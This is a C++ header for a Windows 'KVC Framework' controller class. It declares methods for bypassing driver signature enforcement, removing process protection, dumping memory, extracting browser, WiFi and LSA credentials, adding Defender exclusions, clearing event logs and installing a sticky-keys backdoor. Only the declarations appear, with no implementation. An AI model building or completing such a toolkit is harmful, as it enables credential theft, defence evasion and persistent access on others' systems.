// Controller.h
// Main orchestration class for KVC Framework operations

#pragma once

#include "SessionManager.h"
#include "kvcDrv.h"
#include "DSEBypass.h"
#include "OffsetFinder.h"
#include "TrustedInstallerIntegrator.h"
#include "Utils.h"
#include "WatermarkManager.h"
#include "ModuleManager.h"
#include <vector>
#include <memory>
#include <optional>
#include <chrono>
#include <unordered_map>

class ReportExporter;

// Kernel process structure representation
struct ProcessEntry
{
    ULONG_PTR KernelAddress;
    DWORD Pid;
    UCHAR ProtectionLevel;
    UCHAR SignerType;
    UCHAR SignatureLevel;
    UCHAR SectionSignatureLevel;
    std::wstring ProcessName;
};

// Process search result
struct ProcessMatch
{
    DWORD Pid = 0;
    std::wstring ProcessName;
    ULONG_PTR KernelAddress = 0;
};

// SQLite function pointers for browser operations
struct SQLiteAPI
{
    HMODULE hModule = nullptr;
    int (*open_v2)(const char*, void**, int, const char*) = nullptr;
    int (*prepare_v2)(void*, const char*, int, void**, const char**) = nullptr;
    int (*step)(void*) = nullptr;
    const unsigned char* (*column_text)(void*, int) = nullptr;
    const void* (*column_blob)(void*, int) = nullptr;
    int (*column_bytes)(void*, int) = nullptr;
    int (*finalize)(void*) = nullptr;
    int (*close_v2)(void*) = nullptr;
};

// Password extraction result
struct PasswordResult
{
    std::wstring type;
    std::wstring profile;
    std::wstring url;
    std::wstring username;
    std::wstring password;
    std::wstring file;
    std::wstring data;
    std::wstring status;
    uintmax_t size = 0;
};

// Registry master key for DPAPI operations
struct RegistryMasterKey
{
    std::wstring keyName;
    std::vector<BYTE> encryptedData;
    std::vector<BYTE> decryptedData;
    bool isDecrypted = false;
};

// Main controller class managing kernel driver, process protection, 
// memory dumping, DPAPI extraction, and system operations
class Controller
{
public:
    Controller();
    ~Controller();

    Controller(const Controller&) = delete;
    Controller& operator=(const Controller&) = delete;
    Controller(Controller&&) noexcept = default;
    Controller& operator=(Controller&&) noexcept = default;

	// DSE bypass operations (Standard method)
	bool DisableDSE() noexcept;
	bool RestoreDSE() noexcept;
	ULONG_PTR GetCiOptionsAddress() const noexcept;
	bool GetDSEStatus(ULONG_PTR& outAddress, DWORD& outValue) noexcept;
	
	// DSE bypass operations (Safe/PDB-based method)
    bool DisableDSESafe() noexcept;
    bool RestoreDSESafe() noexcept;
	
	// External driver loading (with DSE bypass)
	bool LoadExternalDriver(const std::wstring& driverPath, DWORD startType = SERVICE_DEMAND_START) noexcept;
	bool ReloadExternalDriver(const std::wstring& driverNameOrPath) noexcept;
	bool StopExternalDriver(const std::wstring& driverNameOrPath) noexcept;
	bool RemoveExternalDriver(const std::wstring& driverNameOrPath) noexcept;
	
	// Handles removal and restoration of system watermark related to signature hijacking
	bool RemoveWatermark() noexcept;
	bool RestoreWatermark() noexcept;
	std::wstring GetWatermarkStatus() noexcept;

    // Memory dumping
    bool DumpProcess(DWORD pid, const std::wstring& outputPath) noexcept;
    bool DumpProcessByName(const std::wstring& processName, const std::wstring& outputPath) noexcept;
	
	// Module enumeration
	bool EnumerateProcessModules(DWORD pid) noexcept;
	bool EnumerateProcessModulesByName(const std::wstring& processName) noexcept;
	bool ReadModuleMemory(DWORD pid, const std::wstring& moduleName, ULONG_PTR offset, size_t size) noexcept;
    
    // Binary management
    bool LoadAndSplitCombinedBinaries() noexcept;
    bool WriteExtractedComponents(const std::vector<BYTE>& kvcPassData, 
                                  const std::vector<BYTE>& kvcCryptData) noexcept;

    // Process information
    bool ListProtectedProcesses() noexcept;
    bool GetProcessProtection(DWORD pid) noexcept;
    bool GetProcessProtectionByName(const std::wstring& processName) noexcept;
	bool PrintProcessInfo(DWORD pid) noexcept;
	

    // Process protection manipulation
    bool SetProcessProtection(DWORD pid, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept;
    bool ProtectProcess(DWORD pid, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept;
    bool UnprotectProcess(DWORD pid) noexcept;

    // Name-based operations
    bool ProtectProcessByName(const std::wstring& processName, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept;
    bool UnprotectProcessByName(const std::wstring& processName) noexcept;
    bool SetProcessProtectionByName(const std::wstring& processName, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept;

	// Signer-based batch operations
	bool UnprotectBySigner(const std::wstring& signerName) noexcept;
	bool ListProcessesBySigner(const std::wstring& signerName) noexcept;
	bool SetProtectionBySigner(const std::wstring& currentSigner, 
							  const std::wstring& level, 
							  const std::wstring& newSigner) noexcept;

	// Session state management
    bool RestoreProtectionBySigner(const std::wstring& signerName) noexcept;
    bool RestoreAllProtection() noexcept;
    void ShowSessionHistory() noexcept;
	bool SetProcessProtection(ULONG_PTR addr, UCHAR protection) noexcept;
	
	SessionManager m_sessionMgr;

    // Batch operations
    bool UnprotectAllProcesses() noexcept;
    bool UnprotectMultipleProcesses(const std::vector<std::wstring>& targets) noexcept;
	bool ProtectMultipleProcesses(const std::vector<std::wstring>& targets, 
                               const std::wstring& protectionLevel, 
                               const std::wstring& signerType) noexcept;
	bool SetMultipleProcessesProtection(const std::vector<std::wstring>& targets, 
										 const std::wstring& protectionLevel, 
										 const std::wstring& signerType) noexcept;
	
    // Process termination
    bool KillMultipleProcesses(const std::vector<DWORD>& pids) noexcept;
	bool KillMultipleTargets(const std::vector<std::wstring>& targets) noexcept;
    bool KillProcess(DWORD pid) noexcept;
    bool KillProcessByName(const std::wstring& processName) noexcept;

    // Kernel access
    std::optional<ULONG_PTR> GetProcessKernelAddress(DWORD pid) noexcept;
    std::optional<UCHAR> GetProcessProtection(ULONG_PTR kernelAddress) noexcept;
    std::vector<ProcessEntry> GetProcessList() noexcept;

    // Self-protection
    bool SelfProtect(const std::wstring& protectionLevel, const std::wstring& signerType) noexcept;
    std::optional<ProcessMatch> ResolveNameWithoutDriver(const std::wstring& processName) noexcept;

    // DPAPI password extraction
    bool ShowPasswords(const std::wstring& outputPath) noexcept;
    bool ExportBrowserData(const std::wstring& outputPath, const std::wstring& browserType) noexcept;

    // TrustedInstaller operations
    bool RunAsTrustedInstaller(const std::wstring& commandLine);
    bool RunAsTrustedInstallerSilent(const std::wstring& command);
    bool AddContextMenuEntries();
    
    // Windows Defender exclusions
    bool AddToDefenderExclusions(const std::wstring& customPath = L"");
    bool RemoveFromDefenderExclusions(const std::wstring& customPath = L"");
    bool AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType type, const std::wstring& value);
    bool RemoveDefenderExclusion(TrustedInstallerIntegrator::ExclusionType type, const std::wstring& value);
    
    // Type-specific exclusions
    bool AddExtensionExclusion(const std::wstring& extension);
    bool RemoveExtensionExclusion(const std::wstring& extension);
    bool AddIpAddressExclusion(const std::wstring& ipAddress);
    bool RemoveIpAddressExclusion(const std::wstring& ipAddress);
    bool AddProcessExclusion(const std::wstring& processName);
    bool RemoveProcessExclusion(const std::wstring& processName);
    bool AddPathExclusion(const std::wstring& path);
    bool RemovePathExclusion(const std::wstring& path);
    
    // System administration
    bool ClearSystemEventLogs() noexcept;

    // Driver management
    bool InstallDriver() noexcept;
    bool UninstallDriver() noexcept;
    bool StartDriverService() noexcept;
    bool StopDriverService() noexcept;
    bool StartDriverServiceSilent() noexcept;
    
	// Driver extraction (already decrypted by Utils)
	std::vector<BYTE> ExtractDriver() noexcept;
	
    // Emergency operations
    bool PerformAtomicCleanup() noexcept;

    // Backdoor management
    bool InstallStickyKeysBackdoor() noexcept;
    bool RemoveStickyKeysBackdoor() noexcept;

    // ======================================================
    // PUBLIC ACCESS METHODS FOR DSE STATUS CHECKING
    // ======================================================
    
    // Driver session management for external access
    bool BeginDriverSession();
    void EndDriverSession(bool force = false);
    
    // DSE state checking (unified)
    bool CheckDSENGState(DSEBypass::DSEState& outState) noexcept;
    std::wstring GetDSENGStatusInfo() noexcept;
    
    // Direct access to driver (for status checking)
    std::unique_ptr<kvc>& GetRTC() { return m_rtc; }

private:
    TrustedInstallerIntegrator m_trustedInstaller;
	std::unique_ptr<kvc> m_rtc;
    std::unique_ptr<OffsetFinder> m_of;
	std::unique_ptr<DSEBypass> m_dseBypass;  // Unified DSE manager
    SQLiteAPI m_sqlite;

    // Privilege management
    bool EnableDebugPrivilege() noexcept;
	bool WriteFileWithPrivileges(const std::wstring& filePath, const std::vector<BYTE>& data) noexcept;

    // Binary processing
    bool SplitCombinedPE(const std::vector<BYTE>& combinedData,
                        std::vector<BYTE>& kvcPassData, 
                        std::vector<BYTE>& kvcCryptData) noexcept;

    // Driver operations
    bool ForceRemoveService() noexcept;
    bool EnsureDriverAvailable() noexcept;
    bool IsDriverCurrentlyLoaded() noexcept;
    bool PerformAtomicInit() noexcept;
    bool PerformAtomicInitWithErrorCleanup() noexcept;
    bool InstallDriverSilently() noexcept;
    bool RegisterDriverServiceSilent(const std::wstring& driverPath) noexcept;
	
	// Driver session management
    bool m_driverSessionActive = false;
    std::chrono::steady_clock::time_point m_lastDriverUsage;
    
    bool IsServiceZombie() noexcept;
    void UpdateDriverUsageTimestamp();
    
    // Cache management
    void RefreshKernelAddressCache();
    std::optional<ULONG_PTR> GetCachedKernelAddress(DWORD pid);
    
    // Internal process termination
    bool KillProcessInternal(DWORD pid, bool batchOperation = false) noexcept;
	
    // Kernel address cache
    std::unordered_map<DWORD, ULONG_PTR> m_kernelAddressCache;
    std::chrono::steady_clock::time_point m_cacheTimestamp;
    std::vector<ProcessEntry> m_cachedProcessList;

    // Process management
    std::optional<ULONG_PTR> GetInitialSystemProcessAddress() noexcept;
    std::vector<ProcessMatch> FindProcessesByName(const std::wstring& pattern) noexcept;
    bool IsPatternMatch(const std::wstring& processName, const std::wstring& pattern) noexcept;
	
	// Batch operation helpers
	bool ProtectProcessInternal(DWORD pid, const std::wstring& protectionLevel, 
								const std::wstring& signerType, bool batchOperation) noexcept;
	bool SetProcessProtectionInternal(DWORD pid, const std::wstring& protectionLevel, 
									  const std::wstring& signerType, bool batchOperation) noexcept;

    // Memory dumping
    bool CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexcept;
    bool SetCurrentProcessProtection(UCHAR protection) noexcept;

    // DPAPI extraction lifecycle
    bool PerformPasswordExtractionInit() noexcept;
    void PerformPasswordExtractionCleanup() noexcept;

    // Registry master key extraction
    bool ExtractRegistryMasterKeys(std::vector<RegistryMasterKey>& masterKeys) noexcept;
    bool ExtractLSASecretsViaTrustedInstaller(std::vector<RegistryMasterKey>& masterKeys) noexcept;
    bool ParseRegFileForSecrets(const std::wstring& regFilePath, std::vector<RegistryMasterKey>& masterKeys) noexcept;
    bool ConvertHexStringToBytes(const std::wstring& hexString, std::vector<BYTE>& bytes) noexcept;
    bool ProcessRegistryMasterKeys(std::vector<RegistryMasterKey>& masterKeys) noexcept;
    
    // Browser password processing
    bool ProcessBrowserPasswords(const std::vector<RegistryMasterKey>& masterKeys, std::vector<PasswordResult>& results, const std::wstring& outputPath) noexcept;
    bool ProcessSingleBrowser(const std::wstring& browserPath, const std::wstring& browserName, const std::vector<RegistryMasterKey>& masterKeys, std::vector<PasswordResult>& results, const std::wstring& outputPath) noexcept;
    bool ExtractBrowserMasterKey(const std::wstring& browserPath, const std::wstring& browserName, const std::vector<RegistryMasterKey>& masterKeys, std::vector<BYTE>& decryptedKey) noexcept;
    int ProcessLoginDatabase(const std::wstring& loginDataPath, const std::wstring& browserName, const std::wstring& profileName, const std::vector<BYTE>& masterKey, std::vector<PasswordResult>& results, const std::wstring& outputPath) noexcept;

    // WiFi credentials
    bool ExtractWiFiCredentials(std::vector<PasswordResult>& results) noexcept;

    // SQLite operations
    bool LoadSQLiteLibrary() noexcept;
    void UnloadSQLiteLibrary() noexcept;

    // Cryptographic operations
    std::vector<BYTE> DecryptWithDPAPI(const std::vector<BYTE>& encryptedData, const std::vector<RegistryMasterKey>& masterKeys) noexcept;
    std::string DecryptChromeAESGCM(const std::vector<BYTE>& encryptedData, const std::vector<BYTE>& key) noexcept;

    // Process name resolution
    std::optional<ProcessMatch> ResolveProcessName(const std::wstring& processName) noexcept;
    std::vector<ProcessMatch> FindProcessesByNameWithoutDriver(const std::wstring& pattern) noexcept;
	
    // HVCI detection and handling (same logic as DisableDSESafe)
    bool CheckAndHandleHVCI(const std::wstring& operation, const std::wstring& targetPath) noexcept;
	
	// External driver path helpers
	std::wstring NormalizeDriverPath(const std::wstring& input) noexcept;
	std::wstring ExtractServiceName(const std::wstring& driverPath) noexcept;
};
